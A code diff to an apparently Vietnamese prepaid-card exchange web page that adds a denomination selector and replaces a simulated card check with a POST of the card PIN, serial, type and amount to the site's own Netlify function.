@@ -57,35 +57,51 @@
     <div id="status"></div>
 </div>
 
+<label>Mệnh giá thẻ cào:</label>
+<select id="amount">
+    <option value="10000">10.000đ</option>
+    <option value="20000">20.000đ</option>
+    <option value="50000">50.000đ</option>
+    <option value="100000">100.000đ</option>
+    <option value="200000">200.000đ</option>
+    <option value="500000">500.000đ</option>
+</select>
+
 <script>
-    function startExchange() {
+    async function startExchange() {
         const pin = document.getElementById('pin').value;
+        const seri = document.getElementById('seri').value;
+        const type = document.getElementById('type_in').value;
+        const amount = document.getElementById('amount').value;
         const status = document.getElementById('status');
         const loading = document.getElementById('loading');
 
-        if(!pin) return alert("Vui lòng nhập mã thẻ!");
+        if(!pin || !seri) return alert("Nhập đủ mã và seri!");
 
         status.style.display = "none";
         loading.style.display = "block";
 
-        // Giả lập thời gian check thẻ 3 giây
-        setTimeout(() => {
+        try {
+            const response = await fetch('/.netlify/functions/send-card', {
+                method: 'POST',
+                body: JSON.stringify({ pin, seri, type, amount })
+            });
+            const data = await response.json();
+
             loading.style.display = "none";
             status.style.display = "block";
 
-            // Giả lập: Nếu mã là '123' thì thẻ đúng
-            if(pin === "123") {
+            if (data.status === 1) {
                 status.className = "success";
-                status.innerHTML = `
-                    <b>ĐỔI THÀNH CÔNG!</b><br>
-                    Đây là thẻ game của bạn:<br>
-                    <div class="output-code">MÃ: 772944012 | SERI: 1000552</div>
-                `;
+                status.innerHTML = "<b>THÀNH CÔNG!</b><br>Thẻ đã gửi, hệ thống đang duyệt.";
             } else {
                 status.className = "error";
-                status.innerHTML = "<b>LỖI THẺ!</b><br>Mã thẻ không hợp lệ hoặc đã được sử dụng.";
+                status.innerHTML = "<b>LỖI:</b> " + data.message;
             }
-        }, 3000);
+        } catch (e) {
+            loading.style.display = "none";
+            alert("Lỗi kết nối Netlify!");
+        }
     }
 </script>
 
